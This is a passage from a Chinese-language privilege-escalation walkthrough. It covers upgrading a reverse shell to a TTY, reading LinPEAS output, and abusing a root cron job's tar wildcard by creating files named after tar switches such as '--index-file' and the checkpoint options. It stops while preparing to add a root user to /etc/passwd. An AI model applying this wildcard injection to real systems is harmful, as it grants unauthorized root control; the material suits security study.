<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo;fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546899-246409719-b852b4c94022cf65cbec06bf40105f99.png" width="650" height="192" class="img_ev3q"></p>
<p>现在我们有了完整的 TTY，我们可以使用箭头浏览命令历史记录、使用制表符补全、清除终端等。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="72审查-linpeas-输出"><strong><div id="id7.2">7.2、审查 LinPEAS 输出</div></strong><a href="#72审查-linpeas-输出" class="hash-link" aria-label="72审查-linpeas-输出的直接链接" title="72审查-linpeas-输出的直接链接">​</a></h4>
<p>就像前面的例子一样，让我们快进一下，假设我们已经进行了一些基本的手动枚举。但由于手动枚举的结果并不理想，所以我们决定运行 LinPEAS，现在我们正在查看输出结果。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645385-1417644854-834ddc41164453a1f0c345dccccd6a79.png" width="827" height="168" class="img_ev3q"></p>
<p>这里我们可以看到一个 cron 任务，以 root 身份每 5 分钟运行一次。我们还可以看到目录和命令都是红色/黄色标识。</p>
<p>cron 任务首先使用cd命令进入到 webroot 目录。然后执行<strong>tar</strong>命令压缩目录中的所有文件，并将备份文件保存在 /root/website 目录中。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="73确定如何利用-cron-job"><strong><div id="id7.3">7.3、确定如何利用 Cron Job</div></strong><a href="#73确定如何利用-cron-job" class="hash-link" aria-label="73确定如何利用-cron-job的直接链接" title="73确定如何利用-cron-job的直接链接">​</a></h4>
<p>www-data 账户拥有 var/www，因此该帐户肯定拥有 /var/www/html 的写入权限。这就是为什么它出现红色/黄色标识。</p>
<p>此外，我们可以看到命令中的 gz 部分也是红色/黄色标识。这是因为命令末尾有一个通配符，允许 tar 一次性压缩目录内的所有文件。</p>
<p>然而，这也为通配符注入漏洞打开了大门。</p>
<p>由于使用了通配符，我们实际上可以创建 switch文件（即以tar命令参数命名的文件），而 tar 在压缩目录中的所有内容时便会将这些文件包含进去。</p>
<p>在 PoC 中，我们可以创建一个以 <strong>-index-file=output.txt</strong> 参数命名的switch文件。然后，一旦 cron 作业运行，tar 便会以 root 身份执行这个参数相对应的动作。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">touch &#x27;/var/www/html/--index-file=output.txt&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547382-168020137-9e72dfd64f90dd2e1a3b387b1ad25b89.png" width="628" height="141" class="img_ev3q"></p>
<p>果然，几分钟后，output.txt 文件出现了，并且它的所有者是 root！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547380-1545838827-f82db61d7aeb360c70812ab699c28d70.png" width="610" height="145" class="img_ev3q"></p>
<p>完美！这证实我们可以利用这个 cron 任务进行恶意攻击！</p>
<p>之所以这样工作，是因为命令行中的通配符被目录中所有文件的文件名称所取代。例如，在我们将“switch”文件添加到目录之前，cron 作业运行时它看起来是这样的：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar -czf /root/website/backup.tar.gz index.html info.php monkey.php webshell.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然而，在我们将“switch”文件添加到目录之后，它就变成了这样：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar -czf /root/website/backup.tar.gz --index-file=output.txt index.html info.php monkey.php webshell.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>因为“switch”文件多是以“--”开头，所以它将是第一个被压缩的 “<strong>文件</strong>”。</p>
<blockquote>
<p>我把“<strong>文件</strong>”放在引号中，是因为我们确实创建了一个这样的文件，但是当 tar 运行时，tar不会将其视为文件，对于 tar 来说，它只是一个开关。</p>
</blockquote>
<p>通过快速从目录中删除 output.txt，然后运行 PoC，我们可以看到，由于我们不是 root（不能在 /root 中写入），所以出现了错误。不过，我们也可以看到 output.txt 文件已经创建。为了确认是我们创建了这个文件（而不是 cron 作业），我们可以看到这次的所有者不是 root，而是 www-data。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547593-725058479-7c415fc6019201c313fa38dba4617c93.png" width="998" height="243" class="img_ev3q"></p>
<blockquote>
<p>注：上面关于 tar 参数命名的文件我均以 “switch文件” 进行表达，我觉得这样更容易理解。而下面关于tar参数的表达我没有继续再用 switch 表达，我觉得此处用开关更能表达意思。</p>
</blockquote>
<p>现在已经我们了解了它的工作原理，让我们看看如何使用不同的 tar 开关进行恶意攻击。</p>
<p>使用 tar –help，我们可以看到 tar所有可用的开关；然而，我们正在寻找两个特定的开关。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547382-1534286694-fa5e6750691fa67bf7015341673b8d60.png" width="628" height="148" class="img_ev3q"></p>
<p>我们感兴趣的开关是上面突出显示的两个检查点开关。通过创建以这些开关命名的“文件”，我们将能够执行文件。</p>
<p>当 cron job 使用 tar 压缩目录时，会执行第一个 checkpoint 开关，启动检查点，一旦检查点启动，checkpoint-action 开关就会触发并为我们执行一个文件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="74设置漏洞并获取-root-shell"><strong><div id="id7.4">7.4、设置漏洞并获取 Root Shell</div></strong><a href="#74设置漏洞并获取-root-shell" class="hash-link" aria-label="74设置漏洞并获取-root-shell的直接链接" title="74设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>好了，我们要做的第一件事就是创建将在第二个检查点开关中执行的文件。</p>
<p>在本例中，我们将编写一个 bash 脚本，让其在 passwd 文件中创建一个 root 用户。</p>
<p>为此，我们需要跳转到攻击者的机器，然后使用 <strong>openssl</strong> 创建散列密码。为简单起见，我们将使用“password”作为密码。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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